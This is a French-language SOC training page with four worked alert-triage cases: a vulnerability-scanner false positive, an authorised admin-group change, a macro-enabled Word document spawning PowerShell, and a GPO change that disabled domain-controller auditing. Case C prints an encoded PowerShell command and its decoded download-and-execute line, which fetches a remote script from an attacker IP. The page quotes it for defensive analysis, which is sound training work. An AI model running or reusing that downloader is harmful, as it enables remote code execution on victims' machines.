---
tags: [cdsa, cases, triage, investigation]
---

# 8. Cas travaillés

Quatre alertes, quatre issues différentes. Pour chacune, **essaie de conclure toi-même** avant de déplier la solution. Tous les noms, IP et dates sont fictifs.

| Cas | Issue attendue |
|---|---|
| A | Faux positif |
| B | Vrai positif bénin |
| C | Intrusion confirmée |
| D | Angle mort de visibilité |

---

## Cas A : « Password spraying » déclenché à 02:00

### L'alerte

> **Règle** : ≥ 10 comptes distincts en échec depuis une même IP en 5 min · **IP** : `10.0.9.15` · **Heure** : mardi 02:00 UTC · **Cibles** : 40 serveurs

### Données

```spl
index=wineventlog EventCode=4625 src_ip="10.0.9.15"
| stats count, dc(user) as users, dc(host) as hosts, values(SubStatus) as substatus by src_ip
```

| count | users | hosts | substatus |
|---|---|---|---|
| 412 | 3 | 40 | 0xc000006a |

### Indices à relever

- IP **interne**, la même **chaque mardi à 02:00** (vérifie l'historique).
- Seulement **3 comptes**, tous des comptes de **service**, sur **40 hôtes** : c'est un balayage de machines, pas de comptes.
- Toujours `0xC000006A` (bon compte, mauvais mot de passe).

??? success "Solution"
    L'IP `10.0.9.15` est l'inventaire du **scanner de vulnérabilités**, qui tourne chaque mardi. Il se connecte avec des identifiants dont **le mot de passe a changé** depuis la dernière rotation, d'où les échecs.

    **Classification** : faux positif (règle correcte, mais cause **opérationnelle** à corriger).

    **Actions** :
    1. Faire corriger le mot de passe du compte de scan (le vrai problème).
    2. **Exclure précisément** `10.0.9.15` pour cette règle, avec propriétaire et date de revue.
    3. Garder une alerte si ce scanner **réussit** soudain depuis un autre hôte ou à une autre heure.

    **Leçon** : un faux positif récurrent indique souvent un **dysfonctionnement réel** à corriger, pas seulement du bruit à masquer.

---

## Cas B : Ajout au groupe Administrateurs

### L'alerte

> **Règle** : événement 4732 (membre ajouté à un groupe local de sécurité) pour `Administrators` · **Hôte** : `SRV-APP07` · **Compte ajouté** : `svc_deploy` · **Acteur** : `adm_lopez`

### Questions à te poser

1. Qui est `adm_lopez` ? Est-ce un administrateur légitime ?
2. Y a-t-il un **ticket de changement** correspondant ?
3. L'heure est-elle cohérente avec une opération de maintenance ?
4. D'où `adm_lopez` s'est-il connecté (poste habituel ou source inhabituelle) ?

### Données

```spl
index=wineventlog host="SRV-APP07" earliest=-2h
  (EventCode=4624 OR EventCode=4732 OR EventCode=4672)
| table _time, EventCode, user, src_ip, Logon_Type, Group_Name
| sort _time
```

??? success "Solution"
    - `adm_lopez` est administrateur système, connecté en RDP depuis son **poste habituel** (IP connue) à 14:05.
    - Un ticket de changement **CHG-2041** couvre « déploiement applicatif sur SRV-APP07 » entre 14:00 et 16:00.
    - L'ajout de `svc_deploy` correspond au déploiement.

    **Classification** : vrai positif **bénin** : la règle a bien détecté un ajout privilégié, mais il est **autorisé**.

    **Actions** : clôturer avec la référence du ticket ; **ne pas exclure la règle**. Proposer d'**enrichir** avec la liste des tickets de changement pour résoudre automatiquement ce cas à l'avenir. Vérifier que `svc_deploy` est **retiré du groupe** après le déploiement (c'est un suivi de bonne hygiène).

    **Leçon** : « autorisé » se **prouve** (ticket, acteur, heure, source). Sans preuve, c'est un vrai positif jusqu'à preuve du contraire.

---

## Cas C : Document Office qui lance PowerShell

### L'alerte

> **Règle** : processus `winword.exe` créant `powershell.exe` · **Hôte** : `WS-0231` · **Utilisateur** : `CORP\mdupont` · **Heure** : 10:42 UTC

### Étape 1 : l'événement

```json
{
  "@timestamp": "2026-03-14T10:42:11.208Z",
  "event":   { "code": "1" },
  "host":    { "name": "WS-0231" },
  "user":    { "name": "mdupont", "domain": "CORP" },
  "process": {
    "name": "powershell.exe",
    "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBhAC4AcABzADEAJwApAA==",
    "parent": { "name": "winword.exe", "command_line": "\"WINWORD.EXE\" \"C:\\Users\\mdupont\\Downloads\\Facture_0314.docm\"" }
  }
}
```

Ce qu'on voit : un document **`.docm`** (macros activables) téléchargé, ouvert dans Word, qui lance PowerShell **masqué** (`-w hidden`), sans profil (`-nop`) et avec une commande **encodée** (`-enc`). Chaque élément est un drapeau rouge.

### Étape 2 : décoder

`-enc` attend du **Base64 sur du texte UTF-16 « petit-boutiste »**. Pour décoder :

```powershell
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<la chaîne>'))
```

Résultat :

```
IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a.ps1')
```

C'est un **téléchargeur** : il récupère un script distant et l'**exécute en mémoire** (`IEX`).

!!! danger "Ne décode jamais en exécutant"
    Décode **sans exécuter** : `GetString(...)` affiche le texte, il ne le lance pas. Ne remplace **jamais** par un `IEX` sur le contenu décodé. Fais-le idéalement dans un environnement isolé ou avec un outil comme CyberChef (« From Base64 » puis « Decode text » en UTF-16LE).

### Étape 3 : pivoter

| Question | Requête |
|---|---|
| L'hôte a-t-il contacté `203.0.113.45` ? | `event.code : "3" and host.name : "WS-0231" and destination.ip : "203.0.113.45"` |
| Des fichiers ont-ils été déposés ? | `event.code : "11" and host.name : "WS-0231" and @timestamp >= "2026-03-14T10:42:00Z"` |
| Persistance ? | `event.code : ("12" or "13") and registry.path : *Run*` |
| D'autres hôtes touchés ? | `destination.ip : "203.0.113.45"` sur **tous** les hôtes |

??? success "Solution"
    **Chronologie (UTC)**

    | Heure | Événement |
    |---|---|
    | 10:41 | Téléchargement de `Facture_0314.docm` (navigateur) |
    | 10:42:11 | Word lance PowerShell masqué avec commande encodée |
    | 10:42:13 | Connexion sortante vers `203.0.113.45:80` (Sysmon 3) |
    | 10:42:15 | Fichier écrit dans `%APPDATA%` (Sysmon 11) |
    | 10:43 | Clé de registre `Run` créée (Sysmon 13), **persistance** |
    | 10:55 | Deux autres postes contactent la même IP |

    **Techniques ATT&CK** : T1566.001 (pièce jointe de phishing) → T1204.002 (exécution par l'utilisateur) → T1059.001 (PowerShell) → T1105 (transfert d'outil) → T1547.001 (clé Run).

    **Classification** : **vrai positif, intrusion confirmée, propagation probable.**

    **Actions** : escalade immédiate (IR), **isoler** `WS-0231` et les 2 autres hôtes, bloquer l'IP et le domaine, réinitialiser les identifiants de `mdupont`, chercher le **mail d'origine** et les autres destinataires, conserver les preuves avant d'éradiquer.

    **Leçon** : c'est la **chaîne parent → enfant → ligne de commande → réseau → persistance** qui prouve l'intrusion, pas un seul log.

---

## Cas D : l'alerte qui n'aurait jamais dû être silencieuse

### L'alerte

> **Règle de santé des sources** : aucun événement du contrôleur de domaine `DC02` depuis 3 h.

### Contexte

La veille, une GPO d'audit a été modifiée. Aucune alerte « sécurité » n'a été levée depuis, ce qui ne signifie **pas** que tout va bien.

### À vérifier

1. Le service de l'agent tourne-t-il sur `DC02` ?
2. Le réseau jusqu'au SIEM est-il ouvert ?
3. Les **politiques d'audit** sont-elles toujours appliquées ? (`auditpol /get /category:*`)
4. Y a-t-il un **trou** dans les événements depuis la modification de la GPO ?

??? success "Solution"
    La nouvelle GPO a **remplacé** la politique d'audit avancée du domaine : l'audit des **connexions** et de l'**accès au service d'annuaire** est désactivé. L'agent fonctionne, mais **aucun événement 4624/4625/4662 n'est plus produit**.

    **Impact** : pendant 3 h, toutes les détections AD (brute force, DCSync, Kerberoasting…) étaient **aveugles**.

    **Actions** :
    1. Corriger la GPO et rétablir l'audit.
    2. **Réexaminer** la période aveugle par d'autres sources (EDR, réseau, pare-feu) pour savoir si quelque chose a pu passer.
    3. Ajouter une **alerte sur le volume** attendu de 4624/4625 par DC (pas seulement sur le silence total) et un **contrôle de conformité de l'audit**.

    **Leçon** : un SOC doit détecter **la perte de sa propre visibilité**. Une source qui parle peu n'est pas forcément une source en bonne santé.

---

## Récapitulatif

| Cas | Classification | Ce qui a tranché |
|---|---|---|
| A | Faux positif | Historique récurrent + nature des comptes + source connue |
| B | Vrai positif bénin | Ticket de changement, acteur et heure cohérents |
| C | Vrai positif | Chaîne parent → enfant → réseau → persistance |
| D | Défaut de visibilité | Perte d'événements d'audit après un changement de GPO |

## Erreurs fréquentes

- Clore le cas A sans corriger la **cause** (mot de passe du scanner).
- Valider le cas B **sans preuve** (« c'est sûrement un admin »).
- Se contenter, dans le cas C, de l'alerte initiale sans **pivoter**.
- Considérer le cas D comme un incident d'infrastructure, **pas de sécurité**.

## À retenir

- La **même alerte** peut cacher quatre réalités très différentes : toujours **qualifier**.
- Un faux positif récurrent révèle souvent un **problème opérationnel**.
- « Autorisé » doit être **démontré**.
- L'intrusion se prouve par une **chaîne** d'événements.
- Surveille aussi **ta propre visibilité**.
